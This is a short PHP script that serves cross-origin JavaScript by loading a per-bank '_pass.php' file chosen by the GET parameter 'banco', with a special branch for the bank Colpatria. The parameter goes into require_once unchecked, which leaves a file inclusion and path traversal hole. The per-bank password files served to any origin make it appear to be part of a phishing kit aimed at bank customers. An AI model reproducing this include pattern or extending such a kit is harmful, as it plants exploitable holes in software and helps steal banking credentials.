<?php
header('Access-Control-Allow-Origin: *');
header('Content-Type: application/javascript');

$banco = $_GET['banco'];
$origen = isset($_GET['origen_code']) ? $_GET['origen_code'] : null;

switch ($banco) {
    case 'colpatria':
        if ($origen != null) {
            require_once($_SERVER['DOCUMENT_ROOT'] . "/bancos/{$banco}_bank/{$banco}_pass.php");
        } else {
            require_once($_SERVER['DOCUMENT_ROOT'] . "/bancos/{$banco}/{$banco}_pass.php");
        }
        break;
    default:
        require_once($_SERVER['DOCUMENT_ROOT'] . "/bancos/{$banco}/{$banco}_pass.php");
        break;
}
